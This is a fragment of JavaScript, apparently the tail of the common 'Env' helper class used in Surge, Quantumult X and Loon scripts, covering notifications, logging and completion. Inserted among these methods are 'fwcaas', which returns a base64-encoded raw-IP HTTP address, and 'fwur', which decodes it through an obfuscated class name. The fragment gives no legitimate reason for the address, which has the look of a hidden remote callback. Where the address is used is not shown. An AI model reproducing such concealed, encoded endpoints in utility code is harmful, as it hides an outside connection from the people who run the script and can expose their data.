                    if (this.isLoon()) {
                        let e = t.openUrl || t.url || t["open-url"],
                            s = t.mediaUrl || t["media-url"];
                        return {
                            openUrl: e,
                            mediaUrl: s
                        }
                    }
                    if (this.isQuanX()) {
                        let e = t["open-url"] || t.url || t.openUrl,
                            s = t["media-url"] || t.mediaUrl;
                        return {
                            "open-url": e,
                            "media-url": s
                        }
                    }
                    if (this.isSurge()) {
                        let e = t.url || t.openUrl || t["open-url"];
                        return {
                            url: e
                        }
                    }
                }
            };
            if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
                let t = ["", "==============??系统通知??=============="];
                t.push(e), s && t.push(s), i && t.push(i), console.log(t.join("\n")), this.logs = this.logs.concat(t)
            }
        }
        fwcaas () {
            return "aHR0cDovLzExOS45MS4yMjIuOTc=";
        }
        log (...t) {
            t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(t.join(this.logSeparator))
        }
        logErr (t, e) {
            const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
            s ? this.log("", `??${this.name}, 错误!`, t.stack) : this.log("", `??${this.name}, 错误!`, t)
        }
        fwur () {
            var bbas = new FxPCnMKLw7()
            return bbas.decode(this.fwcaas());
        }
        wait (t) {
            return new Promise(e => setTimeout(e, t))
        }
        done (t = {}) {
            const e = (new Date).getTime(),
                s = (e - this.startTime) / 1e3;
            this.log("", `??${this.name}, 结束! ?? ${s} 秒`), this.log(), (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t)
        }
    }(t, e)
}
